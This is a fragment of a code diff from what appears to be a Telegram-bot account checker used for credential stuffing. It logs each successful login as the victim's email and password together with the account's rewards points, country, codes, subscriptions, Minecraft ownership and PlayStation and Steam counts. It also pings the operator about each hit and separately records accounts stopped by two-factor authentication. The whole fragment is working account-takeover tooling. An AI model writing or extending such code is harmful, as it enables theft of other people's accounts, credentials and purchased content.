                     try: await c.bot.send_message(ADMIN_ID, f"📢 User {uid} hit:\n{msg}", parse_mode='Markdown', disable_web_page_preview=True)
                     except: pass
 
+                psn_c = psn.get('count', 0); steam_c = steam.get('count', 0)
                 with open(h_f, 'a') as f:
-                    f.write(f"{data['email']}:{data['password']} | Pts:{pts} | Country:{country} | Codes:{len(codes)} | Subs:{len(active)} | Inbox:{len(inbox)}\n")
+                    f.write(f"{data['email']}:{data['password']} | Pts:{pts} | Country:{country} | Codes:{len(codes)} | Subs:{len(active)} | MC:{'YES' if mc.get('owned') else 'NO'} | PSN:{psn_c} | Steam:{steam_c}\n")
 
                 last_h.append(data['email']); last_h = last_h[-5:]
             elif st == '2fa': tfa += 1; open(tfa_f, 'a').write(f"{data.get('email','')}:{data.get('password','')}\n")
